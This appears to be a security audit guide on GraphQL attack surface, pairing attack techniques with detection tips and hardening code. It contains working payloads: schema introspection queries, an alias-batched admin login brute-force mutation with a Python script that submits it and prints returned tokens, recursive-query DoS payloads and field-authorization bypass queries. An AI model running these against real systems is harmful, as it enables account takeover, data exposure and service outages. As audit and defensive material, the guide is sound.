# GraphQL Attack Surface

**Tags:** #high #graphql #api #introspection #batch #dos
**OWASP:** API8:2023 Security Misconfiguration (APIs)
**CVSS Base:** 7.5 (High → exfiltration + brute force)

---

## 📖 What is it

GraphQL exposes a query-by-design API that breaks the REST model of fixed endpoints. The attack surface is radically different and requires specific auditing techniques.

---

## 🔍 `grep_search` Tactics

```
graphql
typeDefs
resolvers
@deprecated
Query {
Mutation {
Subscription {
introspection: false
NoIntrospection
depthLimit
queryComplexity
persisted-queries
useQueryHash
ApolloLink
APQ (Automated Persisted Queries)
```

---

## 💣 Attacks by Category

### 1. Introspection in Production

**How it works:** with introspection enabled, the attacker obtains the full schema — all types, fields, mutations, and methods, including those not accessible through the UI.

```graphql
# Full schema enumeration query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**Static detection:** search for `introspection: false` or explicit disabling in middleware. **Absence** = introspection enabled.

```javascript
//  VULNERABLE — introspection enabled by default
const server = new ApolloServer({ typeDefs, resolvers });

//  CORRECT — disable in production
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production'
});
```

---

### 2. Batch Query / Alias Attack (Brute Force Without Rate Limiting)

**How it works:** GraphQL allows multiple queries in a single request via aliases. An attacker can send 1000 login attempts in a single POST, bypassing rate limiting based on request count.

```graphql
# A single HTTP request → 1000 password attempts
mutation {
  a1: login(email: "admin@site.com", password: "password1") { token }
  a2: login(email: "admin@site.com", password: "password2") { token }
  a3: login(email: "admin@site.com", password: "password3") { token }
  # ... up to a1000
}
```

```python
# .tmp/graphql_batch_bruteforce.py
import requests

TARGET = "http://target.com/graphql"
EMAIL = "admin@site.com"
PASSWORDS = ["password", "123456", "admin", "admin123", "letmein"]

# Build batch query
aliases = "\n".join([
    f'a{i}: login(email: "{EMAIL}", password: "{pwd}") {{ token userId }}'
    for i, pwd in enumerate(PASSWORDS)
])

query = f"mutation {{\n{aliases}\n}}"

r = requests.post(TARGET, json={"query": query}, timeout=15)
data = r.json()

for key, value in data.get('data', {}).items():
    if value and value.get('token'):
        print(f"[MATCH] {key}: token={value['token']}")
```

---

### 2.5. Persisted Queries Bypass (APQ)

**How it works:** To save bandwidth and prevent arbitrary queries, APQ sends a SHA256 hash of the query instead of the query itself. If the server hasn't seen the hash, the client sends the query and the server caches it.
**Attack:** 
1. **Hash Discovery:** Find the query map in the application's JavaScript source.
2. **Brute Force:** If you find a sensitive mutation's hash, you can execute it with your own variables even if the server blocks arbitrary new queries.
3. **Poisoning:** In some misconfigured implementations, you can "persist" a malicious query under a known hash (Cache Poisoning).

---

### 3. Field-Level Authorization Bypass

**How it works:** authorization is only performed at the root resolver, but individual fields do not verify permissions.

```graphql
# Accessing a secret field without permission
{
  user(id: 1) {
    id
    email
    secretApiKey     → field "hidden" in the UI, but available in the schema
    internalNotes    → admin data
    creditCard       → PCI data
  }
}
```

**Detect via introspection:** search for `@deprecated` fields, fields containing `secret`, `key`, `internal`, `admin`, `private`.

---

### 4. Nested Query DoS (Query Depth / Complexity)

**How it works:** circularly nested queries without depth limits bring down the server.

```graphql
# No depth limits → DoS
{
  users {
    friends {
      users {
        friends {
          users {
            friends {
              # ... infinite
            }
          }
        }
      }
    }
  }
}
```

**Recursion Bypass (Circular Fragments):**
If the server has a simple depth limit based on query strings but does not analyze fragments properly:
```graphql
fragment UserFields on User {
  friends {
    ...UserFields
  }
}

query {
  users {
    ...UserFields
  }
}
```

**Detection:** check whether `depthLimit` or `queryComplexity` middleware is present and if it handles fragments correctly.

```javascript
//  CORRECT — limit depth
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(7),                     // maximum 7 levels
    createComplexityLimitRule(1000),   // maximum complexity score
  ]
});
```

---

### 5. Dangerous Mutations via Introspection

```graphql
# After discovering mutations via introspection:
{
  __schema {
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Result reveals mutations such as:
# deleteUser(id: ID!)
# grantAdminRole(userId: ID!)
# resetAllPasswords
# → administrative mutations not available in the UI but present in the schema
```

---

### 6. Custom Directive Logic Bypass (@auth / @access)

**How it works:** Many apps implement custom directives for field-level security. If the logic for these directives is flawed (e.g., it only checks the first layer of a nested query), an attacker can access protected data.

```graphql
type User {
  id: ID!
  email: String! @auth(role: "ADMIN")
  billingInfo: Billing @auth(role: "ADMIN")
}

# Attack: Try to access nested fields that might not have the directive inherited properly
query {
  user(id: "123") {
    billingInfo {
      creditCardNumber # May bypass if @auth only checked billingInfo itself
    }
  }
}
```

**Static Detection:** Trace the implementation of `SchemaDirectiveVisitor` or `mapSchema`. Check if the directive logic is applied recursively to all sub-fields of a protected type.

---

## 🛡️ GraphQL Hardening

```javascript
//  Secure configuration — GraphQL + Express
const { graphqlHTTP } = require('express-graphql');
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const { NoIntrospection } = require('graphql');

app.use('/graphql', graphqlHTTP({
  schema,
  rootValue: resolvers,
  graphiql: process.env.NODE_ENV !== 'production',
  validationRules: [
    // In production, disable introspection
    ...(process.env.NODE_ENV === 'production' ? [NoIntrospection] : []),
    depthLimit(7),
    createComplexityLimitRule(1000),
  ]
}));
```

```javascript
//  Field-level authorization via graphql-shield
const { shield, rule } = require('graphql-shield');

const isAdmin = rule()(async (parent, args, ctx) => {
  return ctx.user && ctx.user.role === 'admin';
});

const permissions = shield({
  User: {
    secretApiKey: isAdmin,    // only admins can access this field
    internalNotes: isAdmin,
  }
});
```

---

## 🔗 Chain Exploits

```
Introspection → Map hidden mutations → Execute privileged action
Batch Attack + login mutation → Admin brute force without rate limiting
Field bypass + PII fields → Dump sensitive data from all users
Nested query DoS → Bring down server with a single request
SSRF via GraphQL URL field → Pivot to internal network
```

---

## 📌 References
- [[nosql-injection]]
- [[idor-bola-broken-object-level-authorization]]
- [HackTricks — GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
- [InQL Scanner](https://github.com/doyensec/inql)